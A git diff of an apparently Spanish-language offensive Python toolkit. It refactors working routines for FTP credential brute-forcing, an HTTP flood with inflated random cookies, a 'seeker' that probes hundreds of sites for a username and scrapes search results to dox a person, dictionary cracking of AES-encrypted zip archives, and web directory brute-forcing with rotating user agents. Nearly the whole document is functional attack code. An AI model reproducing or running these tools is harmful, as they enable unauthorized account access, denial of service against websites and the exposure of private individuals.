@@ -23,9 +23,7 @@ import shutil
 import codecs
 import random
 import base64
-import zipfile
-# import zipfile36 as zipfile 
-# Descomentar en caso de ser incompatible con version python
+import pyzipper
 import platform
 import requests
 import aspose.words as aw
@@ -33,7 +31,7 @@ from bs4 import BeautifulSoup
 from tabulate import tabulate
 from ftplib import FTP, error_perm, error_reply, error_temp
 
-def findperson(nombre, arg):
+def findperson(nombre, arg): # Funciona with
 
     nombre = f"{nombre} /{arg}"
 
@@ -103,16 +101,14 @@ def findperson(nombre, arg):
         save.write(buscador.text)
         save.close()
 
-        save=open("a.txt")
-        leer=save.readlines()
+        with open("a.txt", "r") as leer:
 
-        for line in leer:
+            for line in leer:
 
-            if '{"' in line:
-                resultados=line.replace("var result = ", "")
-                save.close()
-                os.remove("a.txt")
-                #resultados_json=json.loads(resultados)
+                if '{"' in line:
+                    resultados=line.replace("var result = ", "")
+                    os.remove("a.txt")
+                    #resultados_json=json.loads(resultados)
 
         return limpieza(resultados)
 
@@ -175,11 +171,11 @@ def findperson(nombre, arg):
         print("[ERROR] ALGO SUCEDIO")
         pass
 
-def ftpbrute(selec, ftpserver, usuario, password):
+def ftpbrute(selec, ftpserver, usuario, password): # Deberia funcionar with
 
     def limpieza():
 
-        if selec == 1:
+        if selec == "mul":
 
             usuarios=open(usuario)
             lec_usuarios=usuarios.read()
@@ -220,30 +216,30 @@ def ftpbrute(selec, ftpserver, usuario, password):
             print("[ERR] ALGO SUCEDIO X_X")
         else:
             print(f"[GET] USUARIO Y CONTRASEÑA CORRECTOS ->> [U]-{usuario}-[P]-{password}")
+            exit(0)
             
 
     def ataque(usuario, ftpserver):
 
-        password_lines=open(".temppass")
-        lines_pass=password_lines.readlines()
-
+    
         if selec == "mul": # Ataque a multiples usuarios
-            usuario_lec=open(".tempusu")
-            lines=usuario_lec.readlines()
+            with open(".temppass", "r") as  lines_pass, open(".tempusu", "r") as lines:
+                for usuario in lines:
+                    usuario=usuario.strip()
 
-            for usuario in lines:
-                usuario=usuario.replace("\n","")
-                for password in lines_pass:
-
-                    password=password.replace("\n","")
-                    vector(usuario,password,ftpserver)
+                    for password in lines_pass:
+                        password=password.strip()
+                        vector(usuario,password,ftpserver)
+                    lines_pass.seek(0)
 
         if selec == "one": # Un solo usuario
+            with open(".temppass", "r") as  lines_pass:
+                for password in lines_pass:
 
-            for password in lines_pass:
-
-                password=password.replace("\n","")
-                vector(usuario,password,ftpserver)
+                    password=password.strip()
+                    vector(usuario,password,ftpserver)
+        
+        print("[ERROR] NO SE LOGRO ENCONTRAR NINGUNA COINCIDENCIA...")
                 
 
 
@@ -265,7 +261,7 @@ def httpflood(URL):
         global headers, cookies, cookie_pre
         AZAR=random.randint(1,10)
 
-        cookie_pre=str(random.randint(9**100.65,9**101.65)).encode("utf-8")
+        cookie_pre=str(random.randint(9**100,9**101)).encode("utf-8") # (9**100.65,9**101.65)
         cookie_pre=base64.b64encode(cookie_pre*BYTESEND).decode("utf-8")
 
         #headers={"User-Agent":"{}".format(random_agents.get(AZAR))}
@@ -517,19 +513,19 @@ End Sub
         if selec == 2:
             print("[OPTION] EN DESARROLLO")
 
-def seeker(usuario):
+def seeker(usuario): # Funciona with
 
     try:
 
         down_url = requests.get("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/assets/url_dox.txt")
 
-        save_dw = open(".bdd", "w")
-        save_dw.write(down_url.text)
-        save_dw.close()
-        
+        with open(".bdd", "w", encoding="utf-8") as save_dw:
+            save_dw.write(down_url.text)
+
     except:
         
         print("[ERROR] No tienes conexion a internet...")
+        exit(0)
     
 
     status_codes = {
@@ -611,47 +607,42 @@ def seeker(usuario):
         
     }
 
-    def pausa():
-        input("\nPresiona enter para continuar...")
-
-
     def buscador(usuario):
 
         while True:
             
             print("[Tipo de busqueda] ===> [URL] A [{}]\n[Buscando en 800 <sitios>]".format(usuario))
             
-            leer=open(".bdd")
-            lectura=leer.readlines()
-            
-            save=open("capture.txt", "w")
-            for word in lectura:
-                
-                if "\n" in word:
-                    word=word.replace("\n","")
-                
-                try:
-                    word=word.replace("name_find", usuario) # Reemplaza el name_find del diccionario por el usuario
-                    soli=requests.get(word, timeout=20)           
-                    
-                    if soli.status_code == 200 or "xbox" in word:
-                        save.write("\n[URL] "+word)
-                    #a=soli.status_code
-                    
-                    print("[URL] {}\n[{}]".format(word,status_codes.get(soli.status_code)))
+            #leer=open(".bdd")
+            #lectura=leer.readlines()
 
-                except KeyboardInterrupt:
-                    save.close()
-                    exit(0)
+            #save=open("capture.txt", "w")
 
-                except:
-                    pass
+            with open(".bdd", "r") as lectura, open("capture.txt", "w") as save:
+                
+                for word in lectura:
+                    
+                    if "\n" in word:
+                        word=word.replace("\n","")
+                    
+                    try:
+                        word=word.replace("name_find", usuario) # Reemplaza el name_find del diccionario por el usuario
+                        soli=requests.get(word, timeout=20)           
+                        
+                        if soli.status_code == 200 or "xbox" in word:
+                            save.write("\n[URL] "+word)
+                        #a=soli.status_code
+                        
+                        print("[URL] {}\n[{}]".format(word,status_codes.get(soli.status_code)))
+
+                    except KeyboardInterrupt:
+                        save.close()
+                        exit(0)
+
+                    except:
+                        pass
                     
             # Bloque de finalizacion
-            
-            save.close()
-            leer.close()
-
             print("\nSiguiente busqueda: [IN WEB]->>60 sec")
 
             time.sleep(60)
@@ -679,43 +670,43 @@ def seeker(usuario):
             pass
 
         else:
-            save=open("capture.txt", "a")
-            sopa=BeautifulSoup(dox.text, "html.parser") # Obtengo la web en etiquetas
-            
-            for word in sopa.find_all("a"): # Busco parametros <a en sopa
 
-                palabra=str(word.get("href")) # Obtengo la etiqueta especifica href
+            #save=open("capture.txt", "a")
+            with open("capture.txt", "a") as save:
 
-                if "https://" in palabra:
-                    print("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
-                    save.write("\n[URL] {}".format(palabra))
+                sopa=BeautifulSoup(dox.text, "html.parser") # Obtengo la web en etiquetas
                 
-                if "first=" in palabra:
-                    red.append(palabra)
-            
-            for word in red:
+                for word in sopa.find_all("a"): # Busco parametros <a en sopa
 
-                try:
-                    dox=requests.get(base+word, headers=headers)
-                    time.sleep(2) # SI SE DESCOMENTA, NO SE ALCANZA A LEER COMPLETA LA PAGINA /ALL time.sleep
-                except:
-                    pass
-                
-                else:
-                    sopa=BeautifulSoup(dox.text, "html.parser")
+                    palabra=str(word.get("href")) # Obtengo la etiqueta especifica href
+
+                    if "https://" in palabra:
+                        print("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
+                        save.write("\n[URL] {}".format(palabra))
                     
-                    for word_soup in sopa.find_all("a"):
+                    if "first=" in palabra:
+                        red.append(palabra)
+                
+                for word in red:
 
-                        palabra=str(word_soup.get("href"))
+                    try:
+                        dox=requests.get(base+word, headers=headers)
+                        time.sleep(2) # SI SE DESCOMENTA, NO SE ALCANZA A LEER COMPLETA LA PAGINA /ALL time.sleep
+                    except:
+                        pass
+                    
+                    else:
+                        sopa=BeautifulSoup(dox.text, "html.parser")
+                        
+                        for word_soup in sopa.find_all("a"):
 
-                        if "https://" in palabra:
-                            print("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
-                            save.write("\n[URL] {}".format(palabra))
+                            palabra=str(word_soup.get("href"))
+
+                            if "https://" in palabra:
+                                print("[URL] {}\n[{}]".format(palabra,status_codes.get(dox.status_code)))
+                                save.write("\n[URL] {}".format(palabra)) ##########################
 
             print("\nDatos de {} guardados en capture.txt!!".format(usuario))
-            pausa()
-            save.close()
-
             exit(0)
 
     buscador(usuario)
@@ -757,58 +748,49 @@ def tempmail(correo, selec):
 
 
     try:
-        correo=input("Ingresa tu nombre o alias: ")
-
-        while "@" in correo or " " in correo or len(correo) <= 0:
-            correo=input("Ingresa tu nombre o alias: ")
-
+        solicitud=requests.get(MAIL+correo)
+    
     except:
         pass
 
     else:
+        push=0
+        check=[]
+        check_final={}
+        check_str=None
 
+        sopa=BeautifulSoup(solicitud.text, "html.parser")
+
+        for link in sopa.find_all("a"):
+
+            bandeja=str(link.get("href"))
+            
+            if correo+"/" in bandeja:
+                check.append(bandeja)
         try:
-            solicitud=requests.get(MAIL+correo)
-        
+            for link in check:
+
+                if link != check_str:
+
+                    push+=1
+                    check_str=link
+                    check_final.setdefault(push,mail_complemento+link)
         except:
             pass
-
         else:
-            push=0
-            check=[]
-            check_final={}
-            check_str=None
+            print("[EMAIL] {}@mailnesia.com ===> [LISTO PARA USAR] ===> [PUSH] Mensajes: [{}]".format(correo, push))
 
-            sopa=BeautifulSoup(solicitud.text, "html.parser")
-
-            for link in sopa.find_all("a"):
-
-                bandeja=str(link.get("href"))
+            if push > 0 and selec != None:
                 
-                if correo+"/" in bandeja:
-                    check.append(bandeja)
-            try:
-                for link in check:
+                selec = int(selec)
 
-                    if link != check_str:
+                get_mensaje=requests.get(check_final.get(selec))
+                sopa=BeautifulSoup(get_mensaje.text, "html.parser")
 
-                        push+=1
-                        check_str=link
-                        check_final.setdefault(push,mail_complemento+link)
-            except:
-                pass
-            else:
-                print("[EMAIL] {}@mailnesia.com ===> [LISTO PARA USAR] ===> [PUSH] Mensajes: [{}]".format(correo, push))
+                print(limpieza(sopa.get_text()))
+                print("[ALTERNATIVA] ===> {}".format(check_final.get(selec)))             
 
-                if push > 0 and selec != None:
-                                
-                    get_mensaje=requests.get(check_final.get(selec))
-                    sopa=BeautifulSoup(get_mensaje.text, "html.parser")
-
-                    print(limpieza(sopa.get_text()))
-                    print("[ALTERNATIVA] ===> {}".format(check_final.get(selec)))             
-
-def unzipper(dic, directiorio_archivo):
+def unzipper(dic, directiorio_archivo): # Funciona with
 
     def limpieza():
 
@@ -828,19 +810,18 @@ def unzipper(dic, directiorio_archivo):
         limp.close()
 
     def crack():
-
-        diccionario_abrir=open(".bbd")
-        linea=diccionario_abrir.readlines()
-
-        for password in linea:
-
-            if "\n" in password:
-                password=password.replace("\n", "")
-
-            with zipfile.ZipFile(directiorio_archivo, "r") as filesx:
-                filesx.extractall("unzipper/", pwd=password.encode("utf-8"))
-            
-        diccionario_abrir.close()
+        with open(".bbd", "r") as linea: 
+            with pyzipper.AESZipFile(directiorio_archivo, "r") as filesx:  # Cambiamos a AESZipFile para soportar cifrado avanzado
+                for password in linea:
+                    password = password.strip()  # Limpia espacios y saltos de línea
+                    
+                    try:
+                        # Intenta extraer usando la contraseña
+                        filesx.extractall("unzipper/", pwd=password.encode("utf-8"))
+                        print(f"[SUCCESS] Contraseña encontrada: {password}")
+                        #exit(0)  # Sale de la función si la contraseña es correcta
+                    except:
+                        print(f"[FAIL] Contraseña incorrecta: {password}")
 
     try:
         limpieza()
@@ -857,7 +838,7 @@ def unzipper(dic, directiorio_archivo):
     except:
         pass
 
-def webdumper(select, url, dic_path):
+def webdumper(select, url, dic_path): # Funciona with
 
     random_usera={
 
@@ -893,43 +874,45 @@ def webdumper(select, url, dic_path):
 
     def inicial_find(url, dic_path):
 
-        dict = open(dic_path, "r")
-        dict_line = dict.readlines()
-
+        #dict = open(dic_path, "r")
+        #dict_line = dict.readlines()
+        
         if f"/test_script" not in f"{url}test_script": # Chekea si tiene una / al final para los directorios
             url = url + "/"
 
-        for palabra in dict_line:
+        with open(dic_path, "r") as dict_line:
 
-            palabra = palabra.replace("\n", "")
-            url_100 = f"{url}{palabra}"
+            for palabra in dict_line:
 
-            if "//" in url_100:
-                url_100 = url_100.replace("//", "/")
-                url_100 = url_100.replace(":/", "://")
-            
-            headers = { # Especifica los valores necesarios para que get funcione correctamente
+                palabra = palabra.replace("\n", "")
+                url_100 = f"{url}{palabra}"
+
+                if "//" in url_100:
+                    url_100 = url_100.replace("//", "/")
+                    url_100 = url_100.replace(":/", "://")
                 
-                "User-Agent": "{}".format(random_usera.get(random.randint(1,10))),
-                'Cache-Control': 'no-cache',
-                'Pragma': 'no-cache',
-                'Expires': '0'
-                
-            }
+                headers = { # Especifica los valores necesarios para que get funcione correctamente
+                    
+                    "User-Agent": "{}".format(random_usera.get(random.randint(1,10))),
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache',
+                    'Expires': '0'
+                    
+                }
 
-            finder = requests.get(url_100, headers=headers, timeout=8)
+                finder = requests.get(url_100, headers=headers, timeout=8)
 
-            if finder.status_code == 200 or finder.status_code == 403:
+                if finder.status_code == 200 or finder.status_code == 403:
 
-                if finder.status_code == 403:
-                    sig = "PROTEGIDO"
-                elif finder.status_code == 200:
-                    sig = "ENCONTRADO"
+                    if finder.status_code == 403:
+                        sig = "PROTEGIDO"
+                    elif finder.status_code == 200:
+                        sig = "ENCONTRADO"
 
-                if url_100 != url and [url_100, finder.status_code, sig] not in getted:
-                    getted.append([url_100, finder.status_code, sig]) # Se agrega a la variable si se encuentra algo funcional
+                    if url_100 != url and [url_100, finder.status_code, sig] not in getted:
+                        getted.append([url_100, finder.status_code, sig]) # Se agrega a la variable si se encuentra algo funcional
 
-            print(f"[URL] {url_100} ->> {finder.status_code}")
+                print(f"[URL] {url_100} ->> {finder.status_code}")
 
     def recursive_find(dic_path, tipo):
 
